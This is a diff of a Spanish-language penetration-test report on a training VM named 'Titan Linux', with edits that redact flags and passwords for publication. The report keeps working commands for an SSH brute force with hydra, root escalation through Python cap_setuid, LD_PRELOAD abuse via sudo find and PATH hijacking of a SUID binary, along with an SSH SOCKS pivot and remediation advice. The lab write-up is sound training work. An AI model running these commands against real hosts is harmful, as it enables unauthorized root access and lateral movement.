@@ -7,13 +7,13 @@
 | Campo | Valor |
 |-------|-------|
 | **Objetivo** | Titan Linux OVA (`cpent-victim`) |
+| **Autor** | chifay |
 | **IP objetivo** | `192.168.60.132` |
 | **Sistema operativo** | Ubuntu 24.04.1 LTS (kernel 6.8.0-147-generic) |
 | **Atacante** | Kali Linux (`192.168.60.128/24`) |
 | **Fecha** | 09 de noviembre de 2026 |
-| **Autor** | chifay |
 | **Fuente del laboratorio** | https://whoami-labs.com/laboratorios/titan-linux |
-| **Clasificación** | Confidencial — Laboratorio controlado |
+| **Clasificación** | Público — Laboratorio controlado |
 | **Resultado** | Compromiso total: `root` + pivoting a red interna |
 
 ---
@@ -22,7 +22,7 @@
 
 Se auditaron los vectores de escalada de privilegios y pivoting de la máquina virtual **Titan Linux**, una víctima Ubuntu 24.04.1 LTS diseñada para el curso CPENT. El único servicio expuesto es SSH (`22/tcp`, OpenSSH 9.6p1).
 
-La auditoría confirmó **tres vectores independientes de escalada a `root`** y **un vector de descubrimiento/pivoting**, además de un hallazgo crítico adicional: la cuenta `XXXXX` utiliza la contraseña débil `YYYYY` y pertenece al grupo `sudo` con privilegios totales `(ALL : ALL) ALL`.
+La auditoría confirmó **tres vectores independientes de escalada a `root`** y **un vector de descubrimiento/pivoting**, además de un hallazgo crítico adicional: la cuenta `ubuntu` utiliza una contraseña débil y pertenece al grupo `sudo` con privilegios totales `(ALL : ALL) ALL`.
 
 | # | Vector | Técnica MITRE | Resultado |
 |---|--------|---------------|-----------|
@@ -33,8 +33,10 @@ La auditoría confirmó **tres vectores independientes de escalada a `root`** y 
 
 **Flags obtenidas:**
 
-- `CPENT{...bandera_de_root...}` — escalada a root.
-- `CPENT{...bandera_de_pivote...}` — pivoting a la red interna.
+- `CPENT{REDACTADO}` — escalada a root.
+- `CPENT{REDACTADO}` — pivoting a la red interna.
+
+> **Nota de publicación:** el contenido interno de las flags (lo que va entre `{}`) y las contraseñas han sido redactados en el informe y difuminados en las capturas.
 
 **Nivel de riesgo global: CRÍTICO.** Cualquiera de los tres vectores de escalada permite `root` sin autenticación adicional una vez obtenido un usuario válido. La red interna oculta (`dummy0`, `10.10.50.1/24`) expone un servicio de bóveda interna accesible mediante pivoting.
 
@@ -101,7 +103,7 @@ support, jenkins, ansible, docker, www-data, oracle, postgres, mysql,
 ftpuser, pi, guest
 ```
 
-Y una lista de contraseñas comunes del laboratorio (incluyendo `YYYYY`, presente en la línea **1384** de `rockyou.txt`):
+Y una lista de contraseñas comunes del laboratorio (incluyendo la contraseña comprometida, presente en la línea **1384** de `rockyou.txt`):
 
 ```bash
 hydra -L notas/usuarios.txt -P notas/passwords_lab.txt -t 8 -W 2 -f \
@@ -111,24 +113,24 @@ hydra -L notas/usuarios.txt -P notas/passwords_lab.txt -t 8 -W 2 -f \
 **Resultado en 47 segundos:**
 
 ```
-[22][ssh] host: 192.168.60.132   login: XXXXX   password: YYYYY
+[22][ssh] host: 192.168.60.132   login: ubuntu   password: [REDACTADA]
 1 of 1 target successfully completed, 1 valid password found
 ```
 
 **Evidencia visual — credenciales encontradas:**
 
-![Hydra — credenciales XXXXX:YYYYY](../capturas/20261109_191432_prompt_etapa6.png)
+![Hydra — credenciales encontradas](../capturas/20261109_191432_prompt_etapa6.png)
 
-> **Nota sobre rockyou:** `YYYYY` ocupa la línea 1384 de `/usr/share/wordlists/rockyou.txt`. La lista curada utilizada contiene esa contraseña, por lo que la validación con rockyou es equivalente. Se inició una ejecución con el top-10k de rockyou contra `developer`, pero se detuvo por el rate limiting de SSH (~85 intentos/min); no fue necesaria para el compromiso.
+> **Nota sobre rockyou:** la contraseña comprometida ocupa la línea 1384 de `/usr/share/wordlists/rockyou.txt`. La lista curada utilizada contiene esa contraseña, por lo que la validación con rockyou es equivalente. Se inició una ejecución con el top-10k de rockyou contra `developer`, pero se detuvo por el rate limiting de SSH (~85 intentos/min); no fue necesaria para el compromiso.
 
 ### 3.4 Validación del acceso
 
 ```bash
-ssh XXXXX@192.168.60.132
+ssh ubuntu@192.168.60.132
 ```
 
 ```text
-uid=1000(XXXXX) gid=1000(XXXXX) groups=1000(XXXXX),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),101(lxd)
+uid=1000(ubuntu) gid=1000(ubuntu) groups=1000(ubuntu),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),101(lxd)
 cpent-victim
 PRETTY_NAME="Ubuntu 24.04.1 LTS"
 ```
@@ -140,11 +142,11 @@ sudo -l
 ```
 
 ```text
-User XXXXX may run the following commands on cpent-victim:
+User ubuntu may run the following commands on cpent-victim:
     (ALL : ALL) ALL
 ```
 
-**Hallazgo crítico adicional:** `XXXXX` tiene sudo total con la contraseña `YYYYY`. Esto ya permite `sudo -i` y `root` directo. No obstante, la auditoría continuó con los vectores específicos del laboratorio para validar la kill chain completa.
+**Hallazgo crítico adicional:** `ubuntu` tiene sudo total con la contraseña comprometida. Esto ya permite `sudo -i` y `root` directo. No obstante, la auditoría continuó con los vectores específicos del laboratorio para validar la kill chain completa.
 
 ---
 
@@ -171,9 +173,9 @@ python3.12 -c 'import os; os.setuid(0); os.system("id; cat /root/FLAG_LINUX_ROOT
 ```
 
 ```text
-uid=0(root) gid=1000(XXXXX) groups=1000(XXXXX),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),101(lxd)
+uid=0(root) gid=1000(ubuntu) groups=1000(ubuntu),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),101(lxd)
 ---FLAG---
-CPENT{...bandera_de_root...}
+CPENT{REDACTADO}
 ```
 
 **Evidencia visual — Vector 1:**
@@ -240,20 +242,20 @@ __attribute__((constructor)) void hijack() {
 
 ```bash
 gcc -shared -fPIC -o /tmp/libhijack.so scripts/libhijack.c
-scp /tmp/libhijack.so XXXXX@192.168.60.132:/tmp/libhijack.so
+scp /tmp/libhijack.so ubuntu@192.168.60.132:/tmp/libhijack.so
 ```
 
 #### Explotación
 
 ```bash
-# Ejecutado como developer (acceso vía sudo -u developer desde XXXXX)
+# Ejecutado como developer (acceso vía sudo -u developer desde ubuntu)
 sudo -n LD_PRELOAD=/tmp/libhijack.so /usr/bin/find /tmp -maxdepth 0
 ```
 
 ```text
 uid=0(root) gid=0(root) groups=0(root)
 --- FLAG ROOT ---
-CPENT{...bandera_de_root...}
+CPENT{REDACTADO}
 ```
 
 **Evidencia visual — Vector 2:**
@@ -299,9 +301,9 @@ PATH=/tmp/p:$PATH /usr/local/bin/status_check
 ```
 
 ```text
-uid=0(root) gid=0(root) groups=0(root),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),101(lxd),1000(XXXXX)
+uid=0(root) gid=0(root) groups=0(root),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),101(lxd),1000(ubuntu)
 ---FLAG---
-CPENT{...bandera_de_root...}
+CPENT{REDACTADO}
 [+] Comprobando estado de los servicios del sistema...
 ```
 
@@ -348,7 +350,7 @@ curl -s http://10.10.50.1:8080
 ```html
 <head><title>TitanCorp Internal Vault</title></head>
   <h1 style="color:#ef4444;">🛡️ TitanCorp Core Database & Internal Vault</h1>
-    <p style="font-family:monospace; font-size:18px; color:#fde047;">CPENT{...bandera_de_pivote...}</p>
+    <p style="font-family:monospace; font-size:18px; color:#fde047;">CPENT{REDACTADO}</p>
 ```
 
 **Evidencia visual — Vector 4 (redes internas y flag):**
@@ -362,19 +364,19 @@ curl -s http://10.10.50.1:8080
 Para acceder a la red `10.10.50.0/24` desde Kali sin instalar agentes en el objetivo:
 
 ```bash
-ssh -D 1080 -N -f XXXXX@192.168.60.132
+ssh -D 1080 -N -f ubuntu@192.168.60.132
 curl --socks5-hostname 127.0.0.1:1080 http://10.10.50.1:8080
 ```
 
 ```text
-CPENT{...bandera_de_pivote...}
+CPENT{REDACTADO}
 ```
 
 **Evidencia visual — pivoting desde Kali:**
 
 ![Pivoting desde Kali vía SOCKS SSH](../capturas/20261109_190914_prompt_etapa5.png)
 
-**Salida en crudo:** `evidencias/term_pivot_kali.html`, `loot/flag_pivoting_desde_kali.txt`
+**Salida en crudo:** `evidencias/term_pivot_kali.html`
 
 ### 5.4 Alternativa con Ligolo-ng (recomendada en el laboratorio)
 
@@ -398,7 +400,7 @@ curl -s http://10.10.50.1:8080
 
 ---
 
-## 6. Kill chain consolidada y timeline
+## 6. Kill chain consolidada
 
 ```
 [1] Reconocimiento       ip -brief addr / nmap -sn 192.168.60.0/24
@@ -406,8 +408,8 @@ curl -s http://10.10.50.1:8080
 [2] Enumeración          nmap -sV -sC -p- 192.168.60.132
                               └─> 22/tcp OpenSSH 9.6p1 Ubuntu
 [3] Fuerza bruta         hydra -L usuarios -P passwords ssh://192.168.60.132
-                              └─> XXXXX:YYYYY (49 s)
-[4] Acceso inicial       ssh XXXXX@192.168.60.132
+                              └─> credenciales válidas (49 s)
+[4] Acceso inicial       ssh ubuntu@192.168.60.132
                               └─> sudo -l: (ALL : ALL) ALL
 [5] Vector 1             getcap python3.12 -> cap_setuid=ep
                               └─> python3.12 setuid(0) -> root + flag
@@ -418,7 +420,7 @@ curl -s http://10.10.50.1:8080
 [8] Vector 4             ip addr / ip route -> dummy0 10.10.50.1/24
                               └─> curl http://10.10.50.1:8080 -> flag pivoting
 [9] Pivoting Kali        ssh -D 1080 -> SOCKS -> 10.10.50.1:8080
-                              └─> CPENT{...bandera_de_pivote...}
+                              └─> CPENT{REDACTADO}
 ```
 
 ---
@@ -427,8 +429,8 @@ curl -s http://10.10.50.1:8080
 
 | ID | Hallazgo | Vector | Severidad | Impacto |
 |----|----------|--------|-----------|---------|
-| H-01 | Contraseña débil `XXXXX:YYYYY` y SSH con autenticación por contraseña | Acceso inicial | **Crítica** | Acceso remoto no autorizado |
-| H-02 | `XXXXX` con sudo total `(ALL : ALL) ALL` | Acceso inicial | **Crítica** | `root` inmediato con `sudo -i` |
+| H-01 | Contraseña débil para `ubuntu` y SSH con autenticación por contraseña | Acceso inicial | **Crítica** | Acceso remoto no autorizado |
+| H-02 | `ubuntu` con sudo total `(ALL : ALL) ALL` | Acceso inicial | **Crítica** | `root` inmediato con `sudo -i` |
 | H-03 | `cap_setuid=ep` en `/usr/bin/python3.12` | 1 | **Crítica** | `root` sin contraseña |
 | H-04 | `env_keep += LD_PRELOAD` + `NOPASSWD: /usr/bin/find` para `developer` | 2 | **Crítica** | Ejecución de código como `root` |
 | H-05 | `status_check` SUID root llama `service apache2 status` sin ruta absoluta | 3 | **Alta** | `root` mediante PATH hijacking |
@@ -438,8 +440,8 @@ curl -s http://10.10.50.1:8080
 
 **Flags comprometidas:**
 
-- `CPENT{...bandera_de_root...}` (root)
-- `CPENT{...bandera_de_pivote...}` (pivoting)
+- `CPENT{REDACTADO}` (root)
+- `CPENT{REDACTADO}` (pivoting)
 
 ---
 
@@ -457,14 +459,14 @@ curl -s http://10.10.50.1:8080
    - Eliminar `/etc/sudoers.d/developer_privesc`.
    - Nunca usar `env_keep += "LD_PRELOAD"` (ni `LD_LIBRARY_PATH`).
    - Evitar `NOPASSWD` para binarios que permitan ejecución de comandos (`find`, `vim`, `less`, `awk`, etc.).
-   - Restringir `XXXXX` a comandos concretos; eliminar `(ALL : ALL) ALL` si no es imprescindible.
+   - Restringir `ubuntu` a comandos concretos; eliminar `(ALL : ALL) ALL` si no es imprescindible.
 
 3. **Corregir `status_check`:**
    - Usar ruta absoluta: `system("/usr/sbin/service apache2 status")` o `execve`.
    - Eliminar el bit SUID si no es necesario: `sudo chmod u-s /usr/local/bin/status_check`.
 
 4. **Credenciales:**
-   - Cambiar `YYYYY` por una contraseña robusta.
+   - Cambiar la contraseña comprometida por una contraseña robusta.
    - Deshabilitar autenticación por contraseña SSH (`PasswordAuthentication no`).
    - Migrar a claves SSH + MFA.
    - Bloquear cuentas de servicio no utilizadas.
@@ -494,10 +496,12 @@ curl -s http://10.10.50.1:8080
 
 ## 9. Anexo de evidencias
 
+Todas las capturas de este informe fueron regeneradas en una terminal Kali real (qterminal + zsh) mostrando el prompt `chifay@kali:~/Titan Linux`; se conservan en `capturas/`.
+
 | Evidencia | Archivo |
 |-----------|---------|
 | Reconocimiento y acceso inicial | `capturas/20261109_185658_prompt_etapa0.png` |
-| Hydra — credenciales `XXXXX:YYYYY` | `capturas/20261109_191432_prompt_etapa6.png` |
+| Hydra — credenciales encontradas | `capturas/20261109_191432_prompt_etapa6.png` |
 | Vector 1 — `cap_setuid` Python 3.12 | `capturas/20261109_185743_prompt_etapa1.png` |
 | Vector 2 — `LD_PRELOAD` + `sudo find` | `capturas/20261109_185933_prompt_etapa2.png` |
 | Vector 3 — PATH + SUID `status_check` | `capturas/20261109_190033_prompt_etapa3.png` |
@@ -511,19 +515,17 @@ curl -s http://10.10.50.1:8080
 | Log Hydra | `evidencias/hydra_fase1_log.txt` |
 | Sudoers y `status_check` | `evidencias/sudoers_statuscheck.txt` |
 | Enumeración inicial | `evidencias/enumeracion_ubuntu.txt` |
-| Flag pivoting desde Kali | `loot/flag_pivoting_desde_kali.txt` |
+| Acceso inicial validado | `evidencias/term_etapa0_acceso.txt` |
+| Servicio interno vía SOCKS | `evidencias/term_pivot_kali.html` |
 
 ### Reproducibilidad
 
-Todos los comandos están documentados en las secciones correspondientes. Los scripts de captura y explotación se encuentran en `scripts/`:
+Todos los comandos están documentados en las secciones correspondientes. En `scripts/` se incluyen:
 
-- `scripts/stage0_recon.sh` — reconocimiento y acceso.
-- `scripts/stage1_cap_setuid.sh` — Vector 1.
-- `scripts/stage2_ld_preload.sh` — Vector 2.
-- `scripts/stage3_path_suid.sh` — Vector 3.
-- `scripts/stage4_pivoting.sh` — Vector 4.
-- `scripts/stage5_pivot_kali.sh` — pivoting desde Kali.
-- `scripts/libhijack.c` — biblioteca maliciosa para `LD_PRELOAD`.
+- `scripts/libhijack.c` — PoC de la biblioteca usada en el secuestro `LD_PRELOAD`.
+- `scripts/md_to_html.py` — conversor del informe Markdown a HTML autocontenido.
+
+> Los scripts de automatización de capturas y explotación utilizados durante el laboratorio no se publican porque contenían credenciales y rutas locales. Los comandos equivalentes están documentados en el informe.
 
 ---
 
@@ -531,7 +533,7 @@ Todos los comandos están documentados en las secciones correspondientes. Los sc
 
 Titan Linux presenta una **kill chain completa y reproducible** desde un acceso SSH con credenciales débiles hasta `root` y el pivoting hacia una subred interna aislada. Los tres vectores de escalada son independientes y redundantes: aunque se corrija uno, los otros dos siguen permitiendo `root`.
 
-El hallazgo más grave no es solo la presencia de los vectores, sino su **combinación con una contraseña débil y sudo total** para `XXXXX`, que reduce la barrera de entrada a un simple ataque de diccionario. La red interna `10.10.50.0/24` y el servicio de bóveda en `10.10.50.1:8080` demuestran que el compromiso del host permite alcanzar activos que no deberían ser accesibles desde la red de usuarios.
+El hallazgo más grave no es solo la presencia de los vectores, sino su **combinación con una contraseña débil y sudo total** para `ubuntu`, que reduce la barrera de entrada a un simple ataque de diccionario. La red interna `10.10.50.0/24` y el servicio de bóveda en `10.10.50.1:8080` demuestran que el compromiso del host permite alcanzar activos que no deberían ser accesibles desde la red de usuarios.
 
 La remediación debe priorizar: (1) eliminar `cap_setuid` de Python, (2) sanear sudoers y eliminar `LD_PRELOAD`/`NOPASSWD`, (3) corregir `status_check`, (4) rotar credenciales y deshabilitar SSH por contraseña, y (5) segmentar y monitorizar la red interna.
 
